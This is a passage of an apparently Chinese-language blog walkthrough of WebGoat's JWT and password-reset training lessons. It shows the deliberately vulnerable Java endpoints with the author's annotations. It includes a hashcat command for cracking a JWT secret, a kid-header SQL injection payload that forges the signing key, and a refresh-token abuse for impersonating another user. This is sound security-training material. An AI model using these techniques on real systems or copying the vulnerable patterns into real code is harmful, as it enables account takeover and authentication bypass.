class="string">&quot;sub&quot;</span>,<span class="string">&quot;username&quot;</span>,<span class="string">&quot;Email&quot;</span>,<span class="string">&quot;Role&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/JWT/secret/gettoken&quot;,produces = MediaType.TEXT_HTML_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSecretToken</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setIssuer(<span class="string">&quot;WebGoat Token Builder&quot;</span>)</span><br><span class="line">                .setAudience(<span class="string">&quot;webgoat.org&quot;</span>)</span><br><span class="line">                .setIssuedAt(Calendar.getInstance().getTime())</span><br><span class="line">                .setExpiration(Date.from(Instant.now().plusSeconds(<span class="number">60</span>)))</span><br><span class="line">                .setSubject(<span class="string">&quot;tom@webgoat.org&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;Tom&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;Email&quot;</span>,<span class="string">&quot;tom@webgoat.org&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;Role&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Manager&quot;</span>,<span class="string">&quot;Project Administrator&quot;</span>&#125;)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS256,JWT_SECRET).compact();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/secret&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);</span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">            <span class="keyword">if</span> (!claims.keySet().containsAll(expectedClaims))&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-secret-claims-missing&quot;</span>).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (WEBGOAT_USER.equalsIgnoreCase(user))&#123;</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-secret-incorrect-user&quot;</span>).feedbackArgs(user).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY2Mjk3OTMwMiwiZXhwIjoxNjYyOTc5MzYyLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OX3gLBVv0LUp1i59G4sz13o-KSgWHU1es1ddcefA4pU</span><br></pre></td></tr></table></figure>

<p>这里使用字典爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat token.txt -m 16500 -a 3 -w 3  /root/c-jwt-cracker/google-10000-english/google-10000-english.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184940360.png" alt="image-20220912184940360"></p>
<p>这里需要注意的是失效的时间</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912185143775.png" alt="image-20220912185143775"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912185200310.png" alt="image-20220912185200310"></p>
<h3 id="JWTRefreshEndpoint"><a href="#JWTRefreshEndpoint" class="headerlink" title="JWTRefreshEndpoint"></a>JWTRefreshEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.RandomStringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.ResponseEntity.ok;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;jwt-refresh-hint1&quot;, &quot;jwt-refresh-hint2&quot;, &quot;jwt-refresh-hint3&quot;, &quot;jwt-refresh-hint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTRefreshEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;bm5nhSkxCXZkKRy4&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String &gt; validRefreshTokens = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/JWT/refresh/login&quot;, consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity <span class="title function_">follow</span><span class="params">(<span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (json == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) json.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String) json.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equalsIgnoreCase(user) &amp;&amp; PASSWORD.equals(password)) &#123;</span><br><span class="line"><span class="comment">//            如果用户名和密码都相同 为Jerry</span></span><br><span class="line">            <span class="keyword">return</span> ok(createNewTokens(user));</span><br><span class="line"><span class="comment">//            就创建一个新用户</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String ,Object&gt; <span class="title function_">createNewTokens</span><span class="params">(String user)</span> &#123;</span><br><span class="line">        Map&lt;String ,Object&gt; claims = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        claims.put(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line"><span class="comment">//        非admin</span></span><br><span class="line">        claims.put(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">                .setIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + TimeUnit.DAYS.toDays(<span class="number">10</span>)))</span><br><span class="line">                .setClaims(claims)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS512,JWT_PASSWORD)</span><br><span class="line">                .compact();</span><br><span class="line"><span class="comment">//        首先明确这里的 token 其实是 jwt中的</span></span><br><span class="line">        Map&lt;String ,Object&gt; tokenJson = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//        这里的json其实是返回回去给人看的</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">refreshToken</span> <span class="operator">=</span> RandomStringUtils.randomAlphabetic(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//        这里是生成了一个随机字母</span></span><br><span class="line">        validRefreshTokens.add(refreshToken);</span><br><span class="line">        tokenJson.put(<span class="string">&quot;access_token&quot;</span>,token);</span><br><span class="line">        tokenJson.put(<span class="string">&quot;refresh_token&quot;</span>,refreshToken);</span><br><span class="line"><span class="comment">//        这里的</span></span><br><span class="line">        <span class="keyword">return</span> tokenJson;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/refresh/checkout&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;AttackResult&gt; <span class="title function_">checkout</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Authorization&quot;,required = false)</span>String token)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">//            检查是否是tom</span></span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">            <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(user))&#123;</span><br><span class="line">                <span class="keyword">return</span> ok(success(<span class="built_in">this</span>).build());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ok(failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-refresh-not-tom&quot;</span>).feedbackArgs(user).build());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (ExpiredJwtException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> ok(failed(<span class="built_in">this</span>).output(e.getMessage()).build());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> ok(failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/refresh/newToken&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity <span class="title function_">newToken</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Authorization&quot;,required = false)</span>String token,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestBody(required = false)</span> Map&lt;String,Object&gt; json)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span> || json == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            这里是如果两个都没传的话</span></span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">        String user;</span><br><span class="line">        String refreshToken;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            这里我们假设token没传</span></span><br><span class="line">            Jwt&lt;Header,Claims&gt; jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">//            这里当然会抛异常</span></span><br><span class="line">            user = (String) jwt.getBody().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            refreshToken = (String) json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ExpiredJwtException e)&#123;</span><br><span class="line">            user = (String) e.getClaims().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="comment">//            这里获取了user</span></span><br><span class="line">            refreshToken = (String) json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line"><span class="comment">//            获取了refresh_token</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span> || refreshToken == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            如果都不是空</span></span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken))&#123;</span><br><span class="line"><span class="comment">//            如果已经认证的 refreshToken 存在这个的话</span></span><br><span class="line">            validRefreshTokens.remove(refreshToken);</span><br><span class="line"><span class="comment">//            首先移除了refreshToken</span></span><br><span class="line">            <span class="keyword">return</span> ok(createNewTokens(user));</span><br><span class="line"><span class="comment">//            接着创建了一个新用户的token</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题就出现在这里 这里对refreshToken 的校验极小 导致仅仅存在就通过了 没有对绑定的用户做进一步确认 因此这里的user可以随我们控制进入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214902920.png" alt="image-20220912214902920"></p>
<p>但是呢 这道题目必须要读源码 这里有两个重点 一是日志文件 另一个是tom付费</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214026064.png" alt="image-20220912214026064"></p>
<p>这里可以看到给的信息根本不够用</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214104790.png" alt="image-20220912214104790"></p>
<p>这里的登录很明显 这个Jerry 的用户名和密码是已知的 而且既然让我们用tom去买书 那么我们应该有个账号吧</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214441115.png" alt="image-20220912214441115"></p>
<p>因此这里的Jerry 用户名密码当做已知条件 接着就是参数问题了 首先后端接受的参数是json 那么我们必须发送json 注意Content-Type 而这里的参数名也比较好猜 user password 我们也当做已知</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912222956517.png" alt="image-20220912222956517"></p>
<p>这样我们就通过已知账号登录了 并获取了一个refresh_token</p>
<p>接着我们需要去请求newToken 这里也没有给出提示 当我们拿到了所有的值去访问的时候还是会出现认证不通过的情况是什么原因呢</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223031789.png" alt="image-20220912223031789"></p>
<p>这里的jwt解析完成后其实使用的是Jerry</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912220723712.png" alt="image-20220912220723712"></p>
<p>也就是说我们需要一个tom的jwt来请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912220759305.png" alt="image-20220912220759305"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223055438.png" alt="image-20220912223055438"></p>
<p>成功获取到tom的token 买东西</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223201628.png" alt="image-20220912223201628"></p>
<h3 id="JWTFinalEndpoint"><a href="#JWTFinalEndpoint" class="headerlink" title="JWTFinalEndpoint"></a>JWTFinalEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.*;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.impl.TextCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;jwt-final-hint1&quot;, &quot;jwt-final-hint2&quot;, &quot;jwt-final-hint3&quot;, &quot;jwt-final-hint4&quot;, &quot;jwt-final-hint5&quot;, &quot;jwt-final-hint6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTFinalEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JWTFinalEndpoint</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/final/follow/&#123;user&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">follow</span><span class="params">(<span class="meta">@PathVariable(&quot;user&quot;)</span>String user)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(user))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Following yourself seems redundant&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are now following Tom&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/final/delete&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">resetVotes</span><span class="params">(<span class="meta">@RequestParam(&quot;token&quot;)</span> String token)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(token))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> String[] errorMessage = &#123;<span class="literal">null</span>&#125;;</span><br><span class="line">                <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line"><span class="comment">//                    这里相当于一个自定义的用户签名验证系统 SigningKeyResolverAdapter</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line"><span class="comment">//                        获取jwt 中的kid</span></span><br><span class="line">                        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">                            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">//                            执行sql语句这里很明显是存在sql注入的 也就是说这里的密钥其实是我们可以自己控制的</span></span><br><span class="line"><span class="comment">//                            比如这样SELECT key FROM jwt_keys WHERE id = &#x27;webgoat_key&#x27; union select &#x27;MQ==&#x27; from salaries --</span></span><br><span class="line"><span class="comment">//                            那么我们查询出来的密钥就是 这个MQ== 为啥base64 是因为后面有解密</span></span><br><span class="line">                            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                                <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="comment">//                这里是安全的</span></span><br><span class="line">                <span class="keyword">if</span> (errorMessage[<span class="number">0</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(errorMessage[<span class="number">0</span>]).build();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">                <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username))&#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username))&#123;</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913205353864.png" alt="image-20220913205353864"></p>
<p>这里的sql语句中的from 其实是让sql语句顺利执行的 因为这里使用的是hsql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webgoat_key&#x27; union select &#x27;MQ==&#x27; from salaries -- </span><br></pre></td></tr></table></figure>

<p>注意失效时间</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913210325154.png" alt="image-20220913210325154"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913210341503.png" alt="image-20220913210341503"></p>
<h2 id="password-reset"><a href="#password-reset" class="headerlink" title="password_reset"></a>password_reset</h2><h3 id="PasswordReset"><a href="#PasswordReset" class="headerlink" title="PasswordReset"></a>PasswordReset</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordReset</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A7;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;password-reset.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SimpleMailAssignment"><a href="#SimpleMailAssignment" class="headerlink" title="SimpleMailAssignment"></a>SimpleMailAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestClientException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Optional.ofNullable;</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleMailAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String webWolfURL;</span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleMailAssignment</span><span class="params">(RestTemplate restTemplate, <span class="meta">@Value(&quot;$&#123;webwolf.mail.url&#125;&quot;)</span> String webWolfURL)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.restTemplate = restTemplate;</span><br><span class="line">        <span class="built_in">this</span>.webWolfURL = webWolfURL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/PasswordReset/simple-mail&quot;, consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    